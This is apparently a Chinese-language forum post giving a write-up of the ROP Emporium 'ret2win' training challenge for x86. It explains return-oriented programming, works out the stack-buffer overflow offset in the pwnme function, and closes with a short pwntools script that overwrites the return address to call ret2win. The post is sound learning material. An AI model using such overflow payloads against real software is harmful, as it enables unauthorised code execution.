
# [原创]ROP Emporium（一） ret2win

ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 `ret` 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。

简单说一下，ROP Emporium 是通过一系列 ROP（Return-oriented programming）相关的题目挑战来学习 ROP，同时尽量减少反向工程或错误查找。

该项目共提供了七道题，难度跨度从 `ret2text` 到 `ret2csu`。每一道题提供了四种架构包括 x86、x64、arm 和 mips，我将会记录 x86 和 x64 解题过程。

## x86

### 1.检查保护

![](https://bbs.kanxue.com/upload/attach/202101/757977_FU3DXXYFCMTW65.jpg)

未开启栈溢出保护

### 2.分析

`main` 函数：

![](https://bbs.kanxue.com/upload/attach/202101/757977_QKGVZFT374UCHK3.jpg)

调用了 `pwnme()`

`pwnme` 函数：

![](https://bbs.kanxue.com/upload/attach/202101/757977_ES4RFADQNH6PDDA.jpg)

1. `memset` 为 `s` 开辟了 `0x20` 字节的空间，`read` 向 `s` 中写入了 `0x38` 字节的数据，很明显溢出了。

2. 根据 `s` 对于 `ebp` 的偏移为 `ebp-28h` ，则 `s` 对于 `ret addr` 的偏移为 `0x28 + 4`（`ebp` 的长度）

继续看，看到 `ret2win` 函数：

![](https://bbs.kanxue.com/upload/attach/202101/757977_DJU7Q9C5KA6TG76.jpg)

基本思路明确，利用栈溢出覆盖返回地址，将返回地址修改成 `ret2win` 的地址就可以

![](https://bbs.kanxue.com/upload/attach/202101/757977_68F4GSE6FQ6GHZ9.jpg)

### 3.构造EXP

```python
from pwn import *
p = process("./ret2win32")
payload = "\x00" * 0x28 + p32(0xdeadbeef) + p32(0x804862C)
p.sendline(payload)
p.interactive()
```
